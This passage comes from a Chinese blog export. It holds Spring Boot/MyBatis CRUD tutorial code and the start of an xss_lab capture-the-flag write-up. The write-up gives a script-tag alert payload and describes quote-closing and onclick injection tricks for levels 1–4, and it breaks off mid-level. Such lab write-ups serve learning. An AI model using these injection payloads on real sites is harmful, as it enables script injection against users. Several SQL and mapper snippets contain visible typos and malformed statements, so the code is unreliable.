</span><span style="color: #E5C07B">Map</span><span style="color: #ABB2BF">&lt;</span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF">&gt;</span><span style="color: #E06C75"> initParams </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">HashMap</span><span style="color: #ABB2BF">&lt;&gt;</span><span style="color: #E06C75">()</span><span style="color: #ABB2BF">;</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">initParams</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">put</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;exclusions&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&quot;*.js,*.css,/druid/*&quot;</span><span style="color: #ABB2BF">);</span><span style="color: #7F848E; font-style: italic">//白名单</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">bean</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setInitParameters</span><span style="color: #ABB2BF">(initParams);</span><span style="color: #7F848E; font-style: italic">//设置初始化参数</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">return</span><span style="color: #E06C75">  bean</span><span style="color: #ABB2BF">;</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">}</span></span></code></pre></div></div></figure></li></ul><h1 id="Mybatis框架"><a href="#Mybatis框架" class="headerlink" title="Mybatis框架"></a>Mybatis框架</h1><h2 id="整合"><a href="#整合" class="headerlink" title="整合"></a>整合</h2><ul><li><p>创建项目，导入依赖</p><p>由于Mybatis不是官方的，所以需要自己导入</p><figure class="shiki xml"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">dependency</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">         &lt;</span><span style="color: #E06C75">groupId</span><span style="color: #ABB2BF">&gt;org.mybatis.spring.boot&lt;/</span><span style="color: #E06C75">groupId</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">         &lt;</span><span style="color: #E06C75">artifactId</span><span style="color: #ABB2BF">&gt;mybatis-spring-boot&lt;/</span><span style="color: #E06C75">artifactId</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">         &lt;</span><span style="color: #E06C75">version</span><span style="color: #ABB2BF">&gt;2.2.2&lt;/</span><span style="color: #E06C75">version</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">     &lt;/</span><span style="color: #E06C75">dependency</span><span style="color: #ABB2BF">&gt;</span></span></code></pre></div></div></figure></li><li><p>然后配置数据库</p><p>和上面一样</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #E06C75">spring</span><span style="color: #C678DD">:</span></span><span class="line"><span style="color: #E06C75">  datasource</span><span style="color: #C678DD">:</span></span><span class="line"><span style="color: #E06C75">    password</span><span style="color: #C678DD">:</span><span style="color: #E06C75"> </span><span style="color: #D19A66">123456</span></span><span class="line"><span style="color: #E06C75">    username</span><span style="color: #C678DD">:</span><span style="color: #E06C75"> localhost</span></span><span class="line"><span style="color: #E06C75">    url</span><span style="color: #C678DD">:</span><span style="color: #E06C75"> jdbc</span><span style="color: #C678DD">:</span><span style="color: #E06C75">mysql</span><span style="color: #C678DD">:</span><span style="color: #7F848E; font-style: italic">//localhost:3306/localhost?serverTimezone=UTC&amp;useUnicode=true&amp;characterEncoding=utf-8</span></span><span class="line"><span style="color: #E06C75">    driver</span><span style="color: #56B6C2">-</span><span style="color: #E06C75">class</span><span style="color: #56B6C2">-</span><span style="color: #E06C75">name</span><span style="color: #C678DD">:</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">com</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">mysql</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">jdbc</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">Driver</span></span></code></pre></div></div></figure></li><li><p>导入lombok更加方便（通过注解<strong>简化 POJO 类代码</strong>）</p></li></ul><h2 id="配置-1"><a href="#配置-1" class="headerlink" title="配置"></a>配置</h2><ul><li>先写一个user类</li></ul>  <figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">package</span><span style="color: #E06C75"> </span><span style="color: #C678DD">com.example.mybatis.pojo</span><span style="color: #ABB2BF">;</span></span><span class="line"></span><span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">lombok.AllArgsConstructor</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">lombok.Data</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">lombok.NoArgsConstructor</span><span style="color: #ABB2BF">;</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">Data</span></span><span class="line"><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">NoArgsConstructor</span></span><span class="line"><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">AllArgsConstructor</span></span><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">class</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">User</span><span style="color: #E06C75"> </span><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">private</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Integer</span><span style="color: #E06C75"> id</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">private</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> name</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">private</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> password</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure><ul><li><p>再写一个mapper</p><p>UserMapper用来写增删改查</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">package</span><span style="color: #E06C75"> </span><span style="color: #C678DD">com.example.mybatis.mapper</span><span style="color: #ABB2BF">;</span></span><span class="line"></span><span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">com.example.mybatis.pojo.User</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">org.apache.ibatis.annotations.Mapper</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">org.springframework.stereotype.Repository</span><span style="color: #ABB2BF">;</span></span><span class="line"></span><span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">java.util.List</span><span style="color: #ABB2BF">;</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic">//这和注解表明，这是一个mybatis的mapper类：    Dao层</span></span><span class="line"><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">Mapper</span></span><span class="line"><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">Repository</span></span><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">interface</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">UserMapper</span><span style="color: #E06C75"> </span><span style="color: #ABB2BF">{</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure></li><li><p>创建文件用于mapper的映射</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251106210228174.png" alt="image-20251106210228115"></p><p>配置映射文件</p><figure class="shiki xml"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">&lt;?</span><span style="color: #E06C75">xml</span><span style="color: #D19A66"> version</span><span style="color: #ABB2BF">=</span><span style="color: #98C379">&quot;1.0&quot;</span><span style="color: #D19A66"> encoding</span><span style="color: #ABB2BF">=</span><span style="color: #98C379">&quot;UTF-8&quot;</span><span style="color: #ABB2BF"> ?&gt;</span></span><span class="line"><span style="color: #ABB2BF">&lt;!</span><span style="color: #C678DD">DOCTYPE</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">mapper</span></span><span class="line"><span style="color: #ABB2BF">        PUBLIC &quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;</span></span><span class="line"><span style="color: #ABB2BF">        &quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;&gt;</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">mapper</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">namespace</span><span style="color: #ABB2BF">=</span><span style="color: #98C379">&quot;com.emample.mybatis.mapper.UserMapper&quot;</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">    &lt;</span><span style="color: #E06C75">select</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">id</span><span style="color: #ABB2BF">=</span><span style="color: #98C379">&quot;queryUserList&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">resultType</span><span style="color: #ABB2BF">=</span><span style="color: #98C379">&quot;User&quot;</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">        select * from department;</span></span><span class="line"><span style="color: #ABB2BF">    &lt;/</span><span style="color: #E06C75">select</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">    &lt;</span><span style="color: #E06C75">select</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">id</span><span style="color: #ABB2BF">=</span><span style="color: #98C379">&quot;queryUserList&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">resultType</span><span style="color: #ABB2BF">=</span><span style="color: #98C379">&quot;User&quot;</span><span style="color: #ABB2BF"> &gt;</span></span><span class="line"><span style="color: #ABB2BF">        select * from department where id = #{id};</span></span><span class="line"><span style="color: #ABB2BF">    &lt;/</span><span style="color: #E06C75">select</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">    &lt;</span><span style="color: #E06C75">select</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">id</span><span style="color: #ABB2BF">=</span><span style="color: #98C379">&quot;addUser&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">parameterType</span><span style="color: #ABB2BF">=</span><span style="color: #98C379">&quot;User&quot;</span><span style="color: #ABB2BF"> &gt;</span></span><span class="line"><span style="color: #ABB2BF">        insert into user (id,username,password) values (#{id},#{username},#{password})</span></span><span class="line"><span style="color: #ABB2BF">    &lt;/</span><span style="color: #E06C75">select</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">    &lt;</span><span style="color: #E06C75">select</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">id</span><span style="color: #ABB2BF">=</span><span style="color: #98C379">&quot;updateUser&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">parameterType</span><span style="color: #ABB2BF">=</span><span style="color: #98C379">&quot;User&quot;</span><span style="color: #ABB2BF"> &gt;</span></span><span class="line"><span style="color: #ABB2BF">        update user set username=#{username},password#{password} where id=#{id}</span></span><span class="line"><span style="color: #ABB2BF">    &lt;/</span><span style="color: #E06C75">select</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">    &lt;</span><span style="color: #E06C75">select</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">id</span><span style="color: #ABB2BF">=</span><span style="color: #98C379">&quot;deleteUser&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">parameterType</span><span style="color: #ABB2BF">=</span><span style="color: #98C379">&quot;int&quot;</span><span style="color: #ABB2BF"> &gt;</span></span><span class="line"><span style="color: #ABB2BF">        delete from user wher id = #{id}</span></span><span class="line"><span style="color: #ABB2BF">    &lt;/</span><span style="color: #E06C75">select</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">&lt;/</span><span style="color: #E06C75">mapper</span><span style="color: #ABB2BF">&gt;</span></span></code></pre></div></div></figure></li><li><p>在配置文件整合mybatis</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251106213319823.png" alt="image-20251106213319735"></p></li><li><p>增删改查</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">package</span><span style="color: #E06C75"> </span><span style="color: #C678DD">com.example.jdbc.controller</span><span style="color: #ABB2BF">;</span></span><span class="line"></span><span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">org.springframework.beans.factory.annotation.Autowired</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">org.springframework.jdbc.core.JdbcTemplate</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">org.springframework.web.bind.annotation.GetMapping</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">org.springframework.web.bind.annotation.PathVariable</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">org.springframework.web.bind.annotation.RestController</span><span style="color: #ABB2BF">;</span></span><span class="line"></span><span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">java.util.List</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">java.util.Map</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">java.util.Objects</span><span style="color: #ABB2BF">;</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">RestController</span></span><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">class</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">JDBCcontroller</span><span style="color: #E06C75"> </span><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">Autowired</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">JdbcTemplate</span><span style="color: #E06C75"> jdbcTemplate</span><span style="color: #ABB2BF">;</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #7F848E; font-style: italic">//查询数据库中的所有信息</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #7F848E; font-style: italic">//没有实体类，数据库中的东西，怎么获取？----MAP</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">GetMapping</span><span style="color: #E06C75">(</span><span style="color: #98C379">&quot;/userList&quot;</span><span style="color: #E06C75">)</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">List</span><span style="color: #ABB2BF">&lt;</span><span style="color: #E5C07B">Map</span><span style="color: #ABB2BF">&lt;</span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF">,</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF">&gt;&gt;</span><span style="color: #61AFEF"> userList</span><span style="color: #ABB2BF">()</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">sql</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;select * from user&quot;</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">List</span><span style="color: #ABB2BF">&lt;</span><span style="color: #E5C07B">Map</span><span style="color: #ABB2BF">&lt;</span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF">&gt;&gt; </span><span style="color: #E06C75">list_maps</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">jdbcTemplate</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">queryForList</span><span style="color: #ABB2BF">(sql);</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #C678DD">return</span><span style="color: #ABB2BF"> list_maps;</span></span><span class="line"><span style="color: #ABB2BF">    }</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #7F848E; font-style: italic">//增加</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">GetMapping</span><span style="color: #E06C75">(</span><span style="color: #98C379">&quot;/addUser&quot;</span><span style="color: #E06C75">)</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">String</span><span style="color: #61AFEF"> addUser</span><span style="color: #ABB2BF">()</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">sql</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;insert into localhost.user (id,username,password,email,) values(4,&#39;huazi&#39;,&#39;1346&#39;)&quot;</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">jdbcTemplate</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">update</span><span style="color: #ABB2BF">(sql);</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #C678DD">return</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;success&quot;</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF">    }</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #7F848E; font-style: italic">//更新</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">GetMapping</span><span style="color: #E06C75">(</span><span style="color: #98C379">&quot;/updateUser/{id}&quot;</span><span style="color: #E06C75">)</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">String</span><span style="color: #61AFEF"> updateUser</span><span style="color: #ABB2BF">(@</span><span style="color: #E5C07B">PathVariable</span><span style="color: #ABB2BF"> (</span><span style="color: #98C379">&quot;id&quot;</span><span style="color: #ABB2BF">) </span><span style="color: #C678DD">int</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">id</span><span style="color: #ABB2BF">)</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">sql</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #98C379">&quot;update localhost.user set username=?,password? where id=?&quot;</span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF">id;</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #7F848E; font-style: italic">//封装</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF">[] </span><span style="color: #E06C75">objects</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF">[</span><span style="color: #D19A66">2</span><span style="color: #ABB2BF">];</span></span><span class="line"><span style="color: #ABB2BF">        objects[</span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">] </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;huazi&quot;</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF">        objects[</span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">] </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;sdf&quot;</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">jdbcTemplate</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">update</span><span style="color: #ABB2BF">(sql, objects);</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #C678DD">return</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;ok&quot;</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF">    }</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #7F848E; font-style: italic">//删除</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">GetMapping</span><span style="color: #E06C75">(</span><span style="color: #98C379">&quot;/deleteUser/{id}&quot;</span><span style="color: #E06C75">)</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">String</span><span style="color: #61AFEF"> deleteUser</span><span style="color: #ABB2BF">(@</span><span style="color: #E5C07B">PathVariable</span><span style="color: #ABB2BF"> (</span><span style="color: #98C379">&quot;id&quot;</span><span style="color: #ABB2BF">)</span><span style="color: #C678DD">int</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">id</span><span style="color: #ABB2BF">)</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">sql</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #98C379">&quot;delete from localhost.user where id=?&quot;</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">jdbcTemplate</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">update</span><span style="color: #ABB2BF">(sql, id);</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #C678DD">return</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;ok!!!&quot;</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF">    }</span></span><span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure></li></ul>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>xss_lab题解</title>
    <link href="/2025/10/27/xss_lab%E9%A2%98%E8%A7%A3/"/>
    <url>/2025/10/27/xss_lab%E9%A2%98%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<h1 id="xss-lab"><a href="#xss-lab" class="headerlink" title="xss_lab"></a>xss_lab</h1><h2 id="1"><a href="#1" class="headerlink" title="1"></a>1</h2><ul><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202839482.png" alt="image-20250225214917570"></p><p>name和网页相对应</p></li><li><p>直接在name&#x3D;xxxx写js代码进行盗取 <strong>实现弹窗</strong></p></li><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202840955.png" alt="image-20250225215318083"></p></li><li><figure class="shiki json"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">name=&lt;script&gt;alert(</span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">)&lt;/script&gt;</span></span></code></pre></div></div></figure></li></ul><h2 id="2"><a href="#2" class="headerlink" title="2"></a>2</h2><ul><li><p>keyword和网页相对应</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202842618.png" alt="image-20250225215415349"></p><p>无反应</p></li><li><p>查看源代码</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202845248.png" alt="image-20250225215801590"></p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251029212034332.png" alt="image-20250225220029224"></p><p>未闭合</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251029212038710.png" alt="image-20250225220400827"></p><figure class="shiki json"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">加一个“&gt;代表闭合</span></span></code></pre></div></div></figure></li></ul><h2 id="3"><a href="#3" class="headerlink" title="3"></a>3</h2><ul><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202850161.png" alt="image-20250226170011929"></p><p>未闭合</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202851153.png" alt="image-20250226170515351"></p><p>单加一个<strong>‘单引号’</strong>   发现存在html转义编码”&lt;”&gt;”</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202852560.png" alt="image-20250227221510910"></p><p>使用onclick&#x3D;“copyText（）进行闭合<strong>（题目为单引号闭合）</strong></p></li><li><p>执行之后，点击搜索框<strong>触发</strong></p><p><strong>注：</strong>onclick&#x3D;“copyText（）</p><ul><li><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202853800.png" alt="image-20250227223100507"></li></ul></li></ul><h2 id="4"><a href="#4" class="headerlink" title="4"></a>4</h2><ul><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202855186.png" alt="image-20250227221954304"></p><p>点击查询查看</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027202856970.png" alt="image-20250227222107620"></p><p>先闭合使用    <strong>“</strong></p></li><li><p><img 